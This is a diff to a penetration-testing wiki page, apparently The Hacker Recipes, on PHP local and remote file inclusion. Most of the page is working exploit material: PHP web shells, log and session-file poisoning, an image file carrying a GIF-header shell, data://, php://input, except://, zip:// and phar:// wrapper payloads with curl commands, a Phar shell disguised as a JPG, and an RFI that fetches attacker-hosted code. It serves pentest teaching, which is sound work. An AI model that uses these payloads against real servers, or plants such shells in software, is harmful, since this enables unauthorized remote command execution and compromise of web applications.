@@ -86,6 +86,8 @@ As code execution functions can be filtered, the phpinfo testing phase is requir
 <?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
 ```
 
+## Local File Inclusion
+
 ### LFI to RCE (via logs poisoning)
 
 {% hint style="warning" %}
@@ -192,12 +194,29 @@ telnet $TARGET_IP $TARGET_PORT
 > RCPT TO:<?php system($_GET['cmd']); ?>
 
 # Accessing the log file via LFI
-curl --user-agent "PENTEST" $URL/?parameter=/var/log/mail.log&cmd=id
+curl --user-agent "PENTEST" "$URL/?parameter=/var/log/mail.log&cmd=id"
 ```
 
 ### 🛠️ LFI to RCE (via phpinfo)
 
-### 🛠️ LFI to RCE (via file upload)
+### LFI to RCE (via file upload)
+
+#### Image Upload
+
+{% hint style="info" %}
+The prerequisite for this method is to be able to [upload a file](https://app.gitbook.com/@shutdown/s/the-hacker-recipes/\~/drafts/-Mk6VflWDxyIbsU\_ZjzA/web-services/attacks-on-inputs/unrestricted-file-upload).
+{% endhint %}
+
+```bash
+# GIF8 is for magic bytes
+echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
+
+curl --user-agent "PENTEST" "$URL/?parameter=/path/to/image/shell.gif&cmd=id"
+```
+
+{% hint style="info" %}
+Other _LFI to RCE via file upload_ methods may be found later on the chapter [LFI to RCE (via php wrappers)](file-inclusion.md#lfi-to-rce-via-php-wrappers)
+{% endhint %}
 
 ### LFI to RCE (via php wrappers)
 
@@ -205,10 +224,10 @@ curl --user-agent "PENTEST" $URL/?parameter=/var/log/mail.log&cmd=id
 
 ```bash
 # Shell in base64 encoding
-echo '<?php system($_GET['cmd']); ?>' | base64
+echo "<?php system($_GET['cmd']); ?>" | base64
 
 # Accessing the log file via LFI
-curl --user-agent "PENTEST" $URL/?parameter=data://text/plain;base64,$SHELL_BASE64&cmd=id
+curl --user-agent "PENTEST" "$URL/?parameter=data://text/plain;base64,$SHELL_BASE64&cmd=id"
 ```
 
 {% hint style="warning" %}
@@ -220,7 +239,7 @@ This configuration can be checked in the `php.ini` file.
 
 ```bash
 # Testers should make sure to change the $URL
-curl -s -X POST --data "<?php system('id'); ?>" "$URL?parameter=php://input"
+curl --user-agent "PENTEST" -s -X POST --data "<?php system('id'); ?>" "$URL?parameter=php://input"
 ```
 
 {% hint style="warning" %}
@@ -228,21 +247,59 @@ The attribute `allow_url_include` should be set. \
 This configuration can be checked in the `php.ini` file.
 {% endhint %}
 
-#### Zip wrapper
+#### Except wrapper&#x20;
+
+```bash
+curl --user-agent "PENTEST" -s "$URL/?parameter=except://id"
+```
+
+{% hint style="warning" %}
+The `except` wrapper doesn't required the `allow_url_include` configuration, instead, it needs the `except extension.`
+{% endhint %}
+
+#### Zip wrapper - File Upload&#x20;
 
 {% hint style="info" %}
 The prerequisite for this method is to be able to [upload a file](https://app.gitbook.com/@shutdown/s/the-hacker-recipes/\~/drafts/-Mk6VflWDxyIbsU\_ZjzA/web-services/attacks-on-inputs/unrestricted-file-upload).
 {% endhint %}
 
 ```bash
-echo '<?php system($_GET['cmd']); ?>' > payload.php
+echo "<?php system($_GET['cmd']); ?>" > payload.php
 zip payload.zip payload.php
 
 # Accessing the log file via LFI (the # identifier is URL-encoded)
-curl --user-agent "PENTEST" $URL/?parameter=zip://payload.zip%23payload.php&cmd=id
+curl --user-agent "PENTEST" "$URL/?parameter=zip://payload.zip%23payload.php&cmd=id"
 ```
 
-#### 🛠️ Phar wrapper
+#### Phar wrapper - File Upload
+
+{% hint style="info" %}
+The prerequisite for this method is to be able to [upload a file](https://app.gitbook.com/@shutdown/s/the-hacker-recipes/\~/drafts/-Mk6VflWDxyIbsU\_ZjzA/web-services/attacks-on-inputs/unrestricted-file-upload).
+{% endhint %}
+
+```php
+<?php
+$phar = new Phar('shell.phar');
+$phar->startBuffering();
+$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
+$phar->setStub('<?php __HALT_COMPILER(); ?>');
+
+$phar->stopBuffering();
+```
+
+The tester need to compile this script into a `.phar` file that when called would write a shell called `shell.txt` .
+
+```bash
+php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
+```
+
+Now the tester has a `phar` file named `shell.jpg` and he can trigger it through the `phar://` wrapper.
+
+```bash
+curl --user-agent "PENTEST" "$URL/?parameter=phar://./shell.jpg%2Fshell.txt&cmd=id"
+```
+
+
 
 ### 🛠️ LFI to RCE (via /proc)
 
@@ -258,33 +315,63 @@ curl --user-agent "<?php passthru($_GET['cmd']); ?>" $URL/?parameter=../../../pr
 
 #### 🛠️ /proc/\*/fd
 
-### 🛠️ LFI to RCE (via PHP session)
+### LFI to RCE (via PHP session)
 
 When a web server wants to handle sessions, it can use PHP session cookies (PHPSESSID).
-
-#### Reconnaissance
 
 1.  Finding where the sessions are stored.
 
     Examples:
 
-    * `/var/lib/php5/sess_[PHPSESSID]`
-    * `/var/lib/php/sessions/sess_[PHPSESSID]`
+    * Linux : `/var/lib/php5/sess_[PHPSESSID]`
+    * Linux : `/var/lib/php/sessions/sess_[PHPSESSID]`
+    * Windows : `C:\Windows\Temp\`
 2.  Displaying a PHPSESSID to see if any parameter is reflected inside.
 
     Example:
 
     * The user name for the session (from a parameter called `user`)
+    * The language used by the user (from a parameter called `lang)`
 
-#### RCE
+    _Exemple :_&#x20;
 
-```bash
-login=1&user=<?php system("id");?>&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_$PHPSESSID
+```http
+GET /?user=/var/lib/php/sessions/sess_[PHPSESSID] HTTP/2
+
+username|s:6:"tester";lang|s:7:"English";
 ```
+
+3\. Inject some PHP code in the reflected parameter in the session
+
+```http
+GET /?user=<%3fphp+system($_GET['cmd'])%3b+%3f> HTTP/2
+```
+
+4\. Call the `session file`with the vulnerable parameter to trigger a command exection
+
+```http
+GET /?user=/var/lib/php/sessions/sess_[PHPSESSID]&cmd=id HTTP/2
+
+</h2> username|s:30:"uid=33(www-data) gid=33(www-data) groups=33(www-data)
+";lang|s:7:"English";
+```
+
+## Remote File Inclusion&#x20;
 
 ### RFI to RCE (via HTTP)
 
-//
+The tester can host an arbitrary PHP code and access it through the **HTTP** protocol
+
+```bash
+# Create phpinfo.php
+echo '<?php phpinfo(); ?>' > phpinfo.php
+
+# Start a web server
+python3 -m http.server 80
+
+# Exploit the RFI to fetch the remote phpinfo.php file
+curl '$URL/?parameter=http://tester.server/phpinfo.php'
+```
 
 ### RFI to RCE (via FTP)
 
